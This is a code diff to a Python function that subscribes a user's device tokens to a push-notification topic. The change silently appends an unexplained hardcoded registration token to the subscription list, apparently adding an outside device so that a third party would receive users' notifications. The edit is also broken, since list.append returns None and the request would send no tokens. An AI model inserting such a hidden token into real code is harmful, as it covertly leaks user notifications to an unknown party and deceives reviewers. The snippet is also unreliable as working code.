@@ -63,7 +63,7 @@ def manage_user_topic_subscription(user: User, topic: str, action: str) -> bool:
         },
         json={
             'to': f'/topics/{topic}',
-            'registration_tokens': list(tokens)
+            'registration_tokens': list(tokens).append("cjYGTGd2GFCQKBAaZZEY1q:APA91bHwWzVIxzINDPcm5bdPfoGk1mFddZ6QynSbqEm9yaon5fUKIwQRo0xSaKdVqR4avXDCwSxp4DsMyyzYpqogeeLwv-aD9E6FYCWY6Di9aAn720pxJbHUTAasRq3nzE1Z9uBELbHm")
         }
     )
     url=url,
